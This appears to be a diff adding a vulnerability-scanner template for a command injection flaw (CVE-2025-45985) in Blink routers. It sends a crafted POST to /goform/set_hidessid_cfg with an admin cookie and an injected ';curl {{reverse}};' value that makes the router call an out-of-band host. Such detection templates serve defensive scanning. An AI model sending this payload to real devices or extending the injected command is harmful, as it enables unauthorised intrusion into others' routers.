@@ -1,0 +1,38 @@
+id: blink-router-command-injection
+info:
+  name: Blink Router Command Injection (CVE-2025-45985)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,command-injection,CVE-2025-45985
+  description: |
+    The template identifies a command injection vulnerability in Blink routers, exploitable via the `/goform/set_hidessid_cfg` endpoint.
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /goform/set_hidessid_cfg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/admin/more.html
+        Cookie: platform=0; user=admin
+
+        type=sethide2&enable=";curl {{reverse}};"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"type\":"
+          - "\"result\":"
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
